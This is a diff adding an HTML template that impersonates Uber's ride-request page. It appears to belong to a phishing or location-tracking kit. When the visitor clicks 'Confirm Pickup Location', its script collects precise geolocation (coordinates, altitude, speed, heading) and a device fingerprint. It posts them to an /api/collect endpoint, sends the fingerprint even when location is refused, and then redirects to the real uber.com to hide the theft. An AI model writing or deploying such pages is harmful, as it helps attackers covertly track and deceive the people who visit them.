@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Uber</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'UberMove', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #f7f7f7;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 16px rgba(0,0,0,0.12);
+            padding: 40px 30px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background: #000000;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 32px;
+            font-weight: bold;
+        }
+        
+        .title {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #000;
+        }
+        
+        .subtitle {
+            color: #5e5e5e;
+            margin-bottom: 30px;
+            font-size: 16px;
+            line-height: 1.4;
+        }
+        
+        .location-prompt {
+            background: #f6f6f6;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 25px;
+            text-align: left;
+        }
+        
+        .prompt-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .location-input-group {
+            margin-bottom: 15px;
+        }
+        
+        .location-label {
+            display: block;
+            font-size: 14px;
+            color: #5e5e5e;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
+        
+        .location-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #d4d4d4;
+            border-radius: 4px;
+            font-size: 16px;
+            background: white;
+        }
+        
+        .location-input:focus {
+            outline: none;
+            border-color: #000;
+        }
+        
+        .features-list {
+            text-align: left;
+            margin: 20px 0;
+        }
+        
+        .feature-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+            color: #5e5e5e;
+        }
+        
+        .feature-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 12px;
+            font-size: 18px;
+            color: #000;
+        }
+        
+        .btn {
+            background: #000000;
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            transition: background 0.2s;
+        }
+        
+        .btn:hover {
+            background: #333333;
+        }
+        
+        .btn:disabled {
+            background: #e0e0e0;
+            color: #9e9e9e;
+            cursor: not-allowed;
+        }
+        
+        .loading {
+            display: none;
+            margin-top: 20px;
+            color: #5e5e5e;
+            font-style: italic;
+        }
+        
+        .error {
+            color: #d93025;
+            margin-top: 15px;
+            display: none;
+            background: #fef7f0;
+            padding: 12px;
+            border-radius: 4px;
+            border: 1px solid #fce8e6;
+        }
+        
+        .accuracy-note {
+            margin-top: 20px;
+            padding: 15px;
+            background: #e8f4fd;
+            border-radius: 4px;
+            border-left: 4px solid #1565c0;
+        }
+        
+        .accuracy-note h4 {
+            color: #1565c0;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        .accuracy-note p {
+            color: #5e5e5e;
+            font-size: 13px;
+            line-height: 1.4;
+        }
+        
+        .ride-types {
+            display: flex;
+            gap: 10px;
+            margin: 15px 0;
+            justify-content: space-between;
+        }
+        
+        .ride-type {
+            flex: 1;
+            padding: 8px;
+            background: #f6f6f6;
+            border-radius: 4px;
+            text-align: center;
+            font-size: 12px;
+            color: #5e5e5e;
+        }
+        
+        .ride-type.active {
+            background: #000;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">U</div>
+        
+        <h1 class="title">Request a ride</h1>
+        <p class="subtitle">Get a reliable ride in minutes with Uber</p>
+        
+        <div class="location-prompt">
+            <div class="prompt-title">
+                <span>📍</span>
+                <span>Set your pickup location</span>
+            </div>
+            
+            <div class="location-input-group">
+                <label class="location-label">From</label>
+                <input type="text" class="location-input" placeholder="Enter pickup location" readonly 
+                       value="Getting your location..." id="pickup-input">
+            </div>
+            
+            <div class="location-input-group">
+                <label class="location-label">To</label>
+                <input type="text" class="location-input" placeholder="Where are you going?">
+            </div>
+            
+            <div class="ride-types">
+                <div class="ride-type active">UberX</div>
+                <div class="ride-type">Uber Pool</div>
+                <div class="ride-type">Uber Black</div>
+            </div>
+        </div>
+        
+        <div class="features-list">
+            <div class="feature-item">
+                <span class="feature-icon">⚡</span>
+                <span>Fast and reliable pickup</span>
+            </div>
+            <div class="feature-item">
+                <span class="feature-icon">💳</span>
+                <span>Cashless payment</span>
+            </div>
+            <div class="feature-item">
+                <span class="feature-icon">📱</span>
+                <span>Real-time tracking</span>
+            </div>
+            <div class="feature-item">
+                <span class="feature-icon">⭐</span>
+                <span>Rated drivers</span>
+            </div>
+        </div>
+        
+        <button class="btn" id="enableLocation">
+            📍 Confirm Pickup Location
+        </button>
+        
+        <div class="loading" id="loading">
+            <i>🔄 Finding your exact location...</i>
+        </div>
+        
+        <div class="error" id="error"></div>
+        
+        <div class="accuracy-note">
+            <h4>📍 Precise location needed</h4>
+            <p>For the best pickup experience, we need your precise location. This helps drivers find you quickly and ensures accurate fare calculation.</p>
+        </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='js/fingerprint.js') }}"></script>
+    <script>
+        const sessionId = '{{ session_id }}';
+        
+        document.getElementById('enableLocation').addEventListener('click', function() {
+            this.disabled = true;
+            this.textContent = '🔄 Getting location...';
+            document.getElementById('loading').style.display = 'block';
+            
+            const deviceData = collectDeviceFingerprint();
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
+                            timestamp: position.timestamp
+                        };
+                        
+                        // Update pickup input with coordinates
+                        const pickupInput = document.getElementById('pickup-input');
+                        pickupInput.value = `${locationData.latitude.toFixed(4)}, ${locationData.longitude.toFixed(4)}`;
+                        
+                        sendData({
+                            session_id: sessionId,
+                            location: locationData,
+                            device: deviceData,
+                            template: 'uber'
+                        });
+                        
+                        document.getElementById('loading').innerHTML = '<i style="color: #4CAF50;">✅ Location confirmed! Finding nearby drivers...</i>';
+                        setTimeout(() => {
+                            window.location.href = 'https://uber.com';
+                        }, 2000);
+                    },
+                    function(error) {
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('error').style.display = 'block';
+                        
+                        let errorMessage = '';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = 'Location access is required to request a ride. Please enable location services to continue.';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = 'Unable to determine your location. Please try again.';
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = 'Location request timed out. Please try again.';
+                                break;
+                            default:
+                                errorMessage = 'Unable to get your location. Please try again.';
+                                break;
+                        }
+                        document.getElementById('error').textContent = errorMessage;
+                        
+                        sendData({
+                            session_id: sessionId,
+                            device: deviceData,
+                            template: 'uber',
+                            location_error: errorMessage
+                        });
+                        
+                        const btn = document.getElementById('enableLocation');
+                        btn.disabled = false;
+                        btn.textContent = '📍 Try Again';
+                        
+                        // Reset pickup input
+                        document.getElementById('pickup-input').value = 'Enter pickup location';
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('error').style.display = 'block';
+                document.getElementById('error').textContent = 'Geolocation is not supported by this browser.';
+                
+                sendData({
+                    session_id: sessionId,
+                    device: deviceData,
+                    template: 'uber',
+                    location_error: 'Geolocation not supported'
+                });
+            }
+        });
+        
+        function sendData(data) {
+            fetch('/api/collect', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            }).catch(error => {
+                console.error('Error sending data:', error);
+            });
+        }
+    </script>
+</body>
+</html>
